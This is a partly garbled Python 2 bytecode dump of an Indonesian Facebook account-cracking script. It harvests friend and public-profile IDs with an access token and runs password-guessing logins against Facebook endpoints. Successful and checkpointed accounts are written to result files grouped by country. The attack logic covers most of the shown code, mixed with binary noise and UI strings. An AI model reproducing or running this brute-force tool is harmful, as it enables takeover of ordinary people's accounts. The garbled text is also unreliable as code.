[1;97m([1;91mKembali[1;97m)s*   [1;97m([1;91m![1;97m) Tidak ada koneksis   /friends?access_token=R*   R�   s<   [1;97m([1;94m•[1;97m) [1;97mNama File[1;91m :[1;97m R:   s*   [1;97m([1;91m![1;97m) File tidak ada ! s   [1;97m([1;91mKembali[1;97m) s)   [1;97m([1;91m![1;97m) File tidak ada !s    
[1;97m([1;91mKembali[1;97m) R,   R�   s'   [1;97m([1;91m![1;97m) Isi Yg Benar !s4   [0;97m([0;94m•[0;97m) Total Id[1;91m :[1;97m s   .   s   ..  s   ... s$   
([0;94m•[0;97m) Crack Berjalan i   s@   
[1;95m         [ [1;97mMasukan Password Manual Anda![1;95m ]s4   [1;97m([1;93m?[1;97m) Password 1[1;94m > [1;97ms4   [1;97m([1;93m?[1;97m) Password 2[1;94m > [1;97ms4   [1;97m([1;93m?[1;97m) Password 3 [1;94m> [1;97ms?   [1;95m         [ [1;97mPassword Manual Telah Di Buat[1;95m ]s9   [0;97m  Lama Hasil Gunakan Mode Perawan 3 Detik Joss👍s4   [0;97m    Untuk Menghentikan Proses, Tekan CTRL + zs7   [0;97m  Sedang Proses Mohon Bersabar, Semoga Beruntungc   	         s�  |  } y t  j d � Wn t k
 r* n Xyzt j d | d t � } t j t j	 � } t
 d d } t j d d i | d 6| d	 6d
 d 6d d
 d h �} | j } d | k s� d | k rd | d | GHt
 d d � } | j d | d | � | j �  t j | � n�d | k rrd | d | GHt
 d d � } | j d | d | � | j �  t j | � n2t
 d d } t j d d i | d 6| d	 6d
 d 6d d
 d h �} | j } d | k s�d | k r*d | d | GHt
 d d � } | j d | d | � | j �  t j | � nzd | k r�d | d | GHt
 d d � } | j d | d | � | j �  t j | � nt j d d i | d 6�  d	 6d
 d 6d d
 d h �} | j } d | k s�d | k r3d | d �  GHt
 d d � } | j d | d �  � | j �  t j | � nqd | k r�d | d �  GHt
 d d � } | j d | d �  � | j �  t j | � nt j d d i | d 6� d	 6d
 d 6d d
 d h �} | j } d | k s�d | k r<d | d � GHt
 d d � } | j d | d � � | j �  t j | � n� d | k r�d | d � GHt
 d d � } | j d | d � � | j �  t j | � n6 t j d d i | d 6� d	 6d
 d 6d d
 d h �} | j } d | k s�d | k rEd | d � GHt
 d d � } | j d | d � � | j �  t j | � n_ d | k r�d | d � GHt
 d d � } | j d | d � � | j �  t j | � n  Wn n Xd  S(   NR   s   https://graph.facebook.com/s   /?access_token=R�   R�   s%   https://mbasic.facebook.com/login.phpRn   R<   R=   R]   R8   R|   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]R�   s   save-devices   [0;92m[OK][0;97m s    [0;92m◊ [0;97ms   done/manual.txtRp   s   
[OK] s    ◊ RP   s   [0;93m[CP][0;97m s    [0;91m◊[0;97m s   
[CP] R�   s$   https://b-api.facebook.com/login.php(   R   R�   R�   Rc   Rd   Rj   Re   Rf   Rn   Rg   RJ   R�   R�   RQ   R   Rh   R�   R�   R�   (	   R�   R�   R�   R�   t   pass1R�   R�   R�   t   pass2(   t   pass3t   pass4t   pass5(    s   /sdcard/fbcrack1.pyR�   
  s�    
6	

6	

6	

6	

6	

i   s�   
[0;94m──────────────────────────────────────────────────s-   [1;97m([1;94m•[1;97m) [1;97mSelesai ...sS   [1;97m([1;94m•[1;97m) [1;97mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93ms]   [1;97m([1;94m•[1;97m) [1;97mSalin hasil crack lalu simpan[1;91m:[1;97mdone manual.txti2   s
   [1;94m─(#   R-   R�   R   R#   R�   R
   R   Rc   Rd   Rj   Re   Rf   Rg   Rk   R�   RS   Ri   R   R   RQ   R�   R�   RT   R�   R�   R�   R	   R
   R   R   R    R�   R�   R�   RR   (   R�   R:   R   R�   R�   R�   R�   R�   R�   R�   R   R   R�   R�   (    (   R�   R�   R�   s   /sdcard/fbcrack1.pyR�   �  s�    


























])	
c          C   s�   t  j d � y t d d � j �  }  Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t GHd d GHd	 GHd
 GHd GHd d GHt	 �  d  S(   NR   s	   login.txtR:   s'   [0;97m([0;91m![0;97m) Token invalid s   rm -rf login.txtg{�G�z�?i2   s
   [1;91m─s;   [0;94m([0;97m1[0;94m)[0;97m Ambil ID Dari Daftar Teman s;   [0;94m([0;97m2[0;94m) [0;97mAmbil ID Dari Teman/Publik s(   [0;94m([0;91m0[0;94m) [0;97mKembali (
   R   R#   RQ   R�   RT   R
   R   RR   R�   t
   dump_pilih(   Rj   (    (    s   /sdcard/fbcrack1.pyR�   r  s     




		c          C   s�   t  d � }  |  d k r' d GHt �  nr |  d k s? |  d k rI t �  nP |  d k sa |  d k rk t �  n. |  d k s� |  d	 k r� t �  n d GHt �  d  S(
   Ns2   [0;97m([0;94m•[0;97m) Pilih [0;94m> [0;97m R'   s-   [0;97m([0;91m![0;97m) Isi Yg Benar Sayang!R(   t   01R)   t   02R,   R�   (   R-   R�   t   id_temant   idfrom_temanRR   (   t   cuih(    (    s   /sdcard/fbcrack1.pyR�   �  s    



c          C   s�  t  j d � y t d d � j �  }  Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xy t  j d � Wn t	 k
 r� n XyOt  j d � t
 GHd d	 GHt j d
 |  � } t
 j | j � } t d � d d	 GHt d d
 � } xw | d D]k } t j | d � | j | d d � d t t t � � d Gt j j �  t j d � d | d GHq� W| j �  d d	 GHd GHd d	 GHd t t � GHt d � } t  j d d | � d | GHd GHt d � t �  Wn� t k
 r�d GHt d � t �  n� t t f k
 r)d GHt d � t �  nu t k
 rOd GHt d � t �  nO t	 k
 r{d  GHt d � t  j d! � n# t j  j! k
 r�d" GHt" �  n Xd  S(#   NR   s	   login.txtR:   s&   [0;97m([0;91m![0;97m) Token invalids   rm -rf login.txtg{�G�z�?t   outi2   s
   [1;91m─s3   https://graph.facebook.com/me/friends?access_token=s>   [0;97m([0;94m•[0;97m) Mengambil semua ID Teman [0;97m...s   out/id_teman.txtRN   Rn   Rk   s   
s   
[0;97m([0;93ms   [0;97m)[0;94m > g{�G�zt?s   [0;97msB   
[0;97m([0;92m✓[0;97m) [0;97mSukses Mengambil ID [0;97m....s>   
[0;97m([0;94m•[0;97m) [0;97mTotal ID[0;91m :[0;97m %ss=   
[0;97m([0;94m•[0;97m) Simpan Nama File[0;91m : [0;97ms   out/s?   
[0;97m([0;94m•[0;97m) File tersimpan [0;91m: [0;97mout/s�   
[1;91m──────────────────────────────────────────────────s   [0;97m([0;91mKembali[0;97m)s+   [0;97m([0;91m![0;97m) Gagal membuat files   
[0;97m([0;91mKembali[0;97m)s$   [0;97m([0;91m![0;97m) Terhenti ! s    [0;97m([0;91m![0;97m) Gagal !s4   [0;97m([0;91m![0;97m) File anda tidak tersimpan !s   python2 fbcrack.pys,   [0;97m([0;91m![0;97m) Tidak ada koneksi !(#   R   R#   RQ   R�   RT   R
   R   R8   R�   R�   R�   Rc   Rd   Re   Rf   Rg   R   t   idtemanR�   R   R�   R�   R	   R
   R   Rh   R-   t   renameR�   t   KeyboardInterruptt   EOFErrorRS   Ri   R   R   (   Rj   R:   R   t   bzRp   R   (    (    s   /sdcard/fbcrack1.pyR�   �  st    





	
	


			










c    	      C   s  t  j d � y t d d � j �  }  Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xy t  j d � Wn t	 k
 r� n Xy�t  j d � t
 GHd d	 GHt d
 � } y> t j
 d | d |  � } t j | j � } d
 | d GHWn' t k
 rd GHt d � t �  n Xt j
 d | d |  � } t j | j � } t d � d d	 GHt d d � } x{ | d d D]k } t j | d � | j | d d � d t t t � � d Gt j j �  t j d � d | d GHquW| j �  d GHd t t � GHt d � } t  j d d  | � d! | GHt d � t �  Wn� t	 k
 rfd" GHt d � t �  n� t k
 r�d# GHt d � t �  nu t t f k
 r�d$ GHt d � t �  nI t k
 r�d% GHt d& � t �  n# t j  j! k
 r d' GHt" �  n Xd  S((   NR   s	   login.txtR:   s&   [0;97m([0;91m![0;97m) Token Invalids   rm -rf login.txtg{�G�z�?R�   i2   s
   [1;91m─s,   [0;97m([0;94m•[0;97m) User ID Target : s   https://graph.facebook.com/s   ?access_token=s,   [0;97m([0;94m•[0;97m) Nama Akun      : Rr   s0   [0;97m([0;94m•[0;97m) ID Publik Tidak Ada !s   
[0;97m([0;91mKembali[0;97m)s*   ?fields=friends.limit(50000)&access_token=s8   [0;97m([0;94m•[0;97m) [0;97mMengambil Semua ID ...s   out/id_teman_from_teman.txtRN   t   friendsRn   Rk   s   
s   
[0;97m([0;97ms   [0;97m)[0;94m >[0;97mg{�G�zt?s   [0;97m sD   
[0;97m([0;92m ✓ [0;97m)[0;97m Sukses Mengambil ID [0;97m....s)   
[0;97m([0;94m•[0;97m) Total ID : %ss6   
[0;97m([0;94m•[0;97m) [0;97mSimpan Nama File : s   out/s3   
[0;97m([0;92m √ [0;97m) File tersimpan : out/s.   [0;97m([0;91m![0;97m) File tidak tersimpan s,   [0;97m([0;91m![0;97m) Error creating files"   [0;97m([0;91m![0;97m) Terhenti s*   [0;97m([0;91m![0;97m) Teman tidak ada !s   
[0;97m([0;91mkembali[0;97m)s,   [0;97m([0;91m![0;97m) Tidak ada koneksi !(#   R   R#   RQ   R�   RT   R
   R   R8   R�   R�   R�   R-   Rc   Rd   Re   Rf   Rg   RS   R�   R   t   idfromtemanR�   R   R�   R�   R	   R
   R   Rh   R�   R�   R�   Ri   R   R   (	   Rj   R�   t   jokt   opR:   R   R�   Rp   R   (    (    s   /sdcard/fbcrack1.pyR�   �  s�    





	


	


	











c          C   s�   y� t  d � }  d |  } t j | � j } t j d | � j d � j d � } t j d | � j d � } d | GHd | d	 GHt  d
 � t �  WnI t j	 j
 k
 r� d GHt �  n' t k
 r� d GHt  d
 � t �  n Xd  S(
   Ns   
Masukkan username > s   https://www.facebook.com/s   Title">(.*?)</i   s
   | Facebooks   profile/(.*?)" s   
Nama > s   Id   > s   
s	    kembali s   × Koneksi bermasalahs   × Username tidak di temukan(
   R-   Rc   Rd   Rg   R}   R~   R   R�   RR   Ri   R   R   R�   (   R   Rm   R:   Rr   Rk   (    (    s   /sdcard/fbcrack1.pyR�     s"    
$	




c           C   s�   t  j d � t GHt j d � d GHt j d � d GHt j d � d GHt j d � d GHt j d � d GHt j d � d GHt j d � t �  d  S(   NR   g�Q���?s�   [0;91m──────────────────────────────────────────────────s&   [0;97m1).[0;97m Follow My Facebook 1s&   [0;97m2).[0;97m Follow My Facebook 2s$   [0;97m3).[0;97m Follow My Fanspages    [0;91m0[0;97m).[0;91m Kembali(   R   R#   R�   R
   R   t
   pilih_saya(    (    (    s   /sdcard/fbcrack1.pyR�   1  s     







c          C   s�   t  d � }  |  d k r' d GHt �  n� |  d k rJ t j d � t �  na |  d k rm t j d � t �  n> |  d k r� t j d	 � t �  n |  d
 k r� t �  n d GHd  S(   Ns   [1;97m(?) Pilih [94m>[1;97m R'   s%   [0;97m([0;91m![0;97m) Isi Yg BenarR(   s+   xdg-open https://www.facebook.com/Romi.UyeyR)   s/   xdg-open https://www.facebook.com/romi.rizal.58R*   s2   xdg-open https://www.facebook.com/106671987887618/R,   s'   [0;97m([0;91m![0;97m) Isi Yg Benar !(   R-   R�   R   R#   R�   RR   (   R�   (    (    s   /sdcard/fbcrack1.pyR�   D  s     







c           C   sw   t  j d � t GHt j d � d GHt j d � d GHt j d � d GHt j d � d GHt j d � d GHt �  d  S(   NR   g�Q���?s�   [0;91m──────────────────────────────────────────────────s(   [0;97m1).[0;97m Group 1 -> RATU ERROR s#   [0;97m2).[0;97m Group 2 -> VIRAL s   [0;91m0[0;97m).[0;97m Back(   R   R#   R�   R
   R   t
   pilih_grup(    (    (    s   /sdcard/fbcrack1.pyR   X  s    





c          C   s�   t  d � }  |  d k r' d GHt �  n� |  d k r| t j d � t GHt j d � d d GHt d	 � t j d
 � t �  nw |  d k r� t j d � t GHt j d � d d GHt d � t j d
 � t �  n" |  d k r� t	 �  n d GHt �  d  S(   Ns/   [0;97m([0;93m?[0;97m) Pilih [0;94m>[0;93m R'   s%   [0;97m([0;91m![0;97m) Isi Yg BenarR(   R   g�Q���?i2   s
   [0;91m─sD   [0;93m  ---[0;91m>[0;93m Anda Akan Di Arahkan Ke Group RATU ERRORs8   xdg-open https://www.facebook.com/groups/321618655283631R)   s?   [0;93m  ---[0;91m>[0;93m Anda Akan Di Arahkan Ke Group VIRALs8   xdg-open https://www.facebook.com/groups/453688872336137R,   (
   R-   R�   R   R#   R�   R
   R   R   R   RR   (   t   gc(    (    s   /sdcard/fbcrack1.pyR�   g  s0    


	




	



c           C   s�   t  j d � t GHd GHt j d � d GHt j d � d GHt j d � d GHt j d � d GHt j d � d GHt j d � d	 GHt j d � d
 GHt j d � d GHt j d � d GHt j d � t �  d  S(   NR   s�   [0;91m──────────────────────────────────────────────────g�Q���?s-   [0;97m1). [0;97mLihat Hasil Crack Indonesias.   [0;97m2). [0;97mLihat Hasil Crack Bangladeshs-   [0;97m3). [0;97mLihat Hasil Crack Pakistan s*   [0;97m4). [0;97mLihat Hasil Crack India s'   [0;97m5). [0;97mLihat Hasil Crack Usas*   [0;97m6). [0;97mLihat Hasil Crack Manuals*   [0;97m7). [0;97mLihat Hasil Crack Follows    [0;91m0[0;97m). [0;91mKembali(   R   R#   R�   R
   R   t   pilih_hasil(    (    (    s   /sdcard/fbcrack1.pyR�   �  s.    










c          C   s;  t  d � }  |  d k r' d GHt �  n|  d k rJ t j d � t �  n� |  d k rm t j d � t �  n� |  d k r� t j d	 � t �  n� |  d
 k r� t j d � t �  n� |  d k r� t j d
 � t �  na |  d k r� t j d � t �  n> |  d k rt j d � t �  n |  d k r2t �  n d GHd  S(   Ns   [0;97m(?) Pilih [94m>[0;97m R'   s%   [0;97m([0;91m![0;97m) Isi Yg BenarR(   s   xdg-open done/indo.txtR)   s   xdg-open done/bangla.txtR*   s   xdg-open done/pakis.txtR+   s   xdg-open done/hindi.txtR�   s   xdg-open done/usa.txtR�   s   xdg-open done/manual.txtR�   s   xdg-open done/follow.txtR,   (   R-   R  R   R#   R�   RR   (   R�   (    (    s   /sdcard/fbcrack1.pyR  �  s8    















c           C   sV   t  j d � t GHd GHt j d � t d � t  j d � t d � t  j d � d  S(   NR   s�   [0;91m──────────────────────────────────────────────────g�Q���?s$   [0;92mMemperbarui Script ...[0;93ms   git pull origin masters   
[0;97m([0;91mKembali[0;97m)s
   python2 fb.py(   R   R#   R�   R
   R   R   R-   (    (    (    s   /sdcard/fbcrack1.pyR�   �  s    




t   __main__s/    
---> Kalau Mau Recode Izin Dulu Boss Paham ! (   s
   User-Agents�  Mozilla/5.0 (Linux; Android 9; Infinix X652B Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 [FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171848;FBDM/{density=2.0,width=720,height=1428};FBLC/en_US;FBRV/243389251;FBCR/Warid;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X652B;FBSV/9;FBOP/19;FBCA/arm64-v8a:;](   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](c   R   R}   R	   R   R
   Rc   t   randomt	   threadingRe   t   multiprocessing.poolR    t   requests.exceptionsR   t   reloadt   setdefaultencodingRV   t   ImportErrorR#   t   bs4R   RU   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   t   Threadt   tt   startR   RX   R   R   R$   R�   t   backt   threadst   berhasilR�   t   gagalR�   R�   Rk   t   fbidt   usernameR�   R�   t   vulnott   vulnR   R   R    t   CorrectUsernamet   CorrectPasswordt   loopR-   R@   R&   R%   R.   R3   R8   R/   R0   R1   RR   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R   R�   R�   R  R�   t   __name__(    (    (    s   /sdcard/fbcrack1.pyt   <module>   s�   x







		

		










										9		'	!	?	!				�		�		�		�		�		�		�			@	G							 	

